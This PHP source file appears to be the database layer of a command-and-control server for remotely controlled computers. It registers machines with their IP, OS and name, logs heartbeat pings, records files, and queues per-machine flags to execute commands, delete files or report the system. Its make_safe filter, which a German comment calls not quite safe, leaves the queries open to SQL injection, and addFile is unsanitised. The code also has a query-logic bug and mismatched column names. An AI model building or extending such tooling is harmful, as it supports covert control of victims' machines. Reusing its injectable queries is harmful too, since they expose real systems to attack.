<?php

class ml_querys {

	private $_connection = null;


	public function __construct($cr_database){
		$this->_connection = $cr_database;
	}

	public function whatToExexute($uid){
		$uid = $this->make_safe($uid);
		$i = $this->_connection->db_assoc("SELECT ex_commands, del_files, report_system FROM execute WHERE fk_uid = '$uid'");
		return json_encode($i);
	}

	public function newComputer($uid){
		$uid = $this->make_safe($uid);
		$this->addComputer($uid, 'N/A', 'N/A');
		$this->_connection->db_assoc("INSERT INTO execute (id, fk_uid, ex_commands, del_files, report_system) VALUES (NULL, '$uid', '0', '0', '1')");
	}

	public function updateExecute(){
		//UPDATE execute` SET ex_commands = '1', dl_files = '1', report_system = '0' WHERE id =1;
	}

	public function computerExists($uid){
		$uid = $this->make_safe($uid);
		$i = $this->_connection->get_query_count("SELECT id FROM computers WHERE uid = '$uid'");
		return ($i == 1 ? true : false);
	}

	public function isSomethingToEx($uid){
		$uid = $this->make_safe($uid);
		$i = $this->_connection->get_query_count("SELECT * FROM execute WHERE fk_uid = '$uid' AND ex_commands =1 OR dl_files =1 OR report_system =1");
		return ($i == 1 ? true : false);
	}

	public function addComputer($uid, $os, $pcname){
		$ip = $_SERVER["REMOTE_ADDR"];
		$uid = $this->make_safe($uid);
		$os = $this->make_safe($os);
		$pcname = $this->make_safe($pcname);
			
		$computer = $this->_connection->db_assoc("INSERT INTO computers (id, uid, ip, os, name, date) VALUES (NULL, '$uid', '$ip', '$os', '$pcname', CURRENT_TIMESTAMP)");
	}

	public function liveBit($uid){
		$ip = $_SERVER["REMOTE_ADDR"];
		$uid = $this->make_safe($uid);
			
		$computer = $this->_connection->db_assoc("INSERT INTO ping (id, uid, ip, date) VALUES (NULL, '$uid', '$ip', CURRENT_TIMESTAMP)");
	}

	public function addFile($path, $name){
		$file = $this->_connection->db_assoc("INSERT INTO files (id, name, path, date) VALUES (NULL, '$name', '$path', CURRENT_TIMESTAMP)");
	}

	//Nicht ganz so safe aber naja
	public function make_safe($variable){
		return strip_tags(trim(stripslashes($variable)));
	}
		


}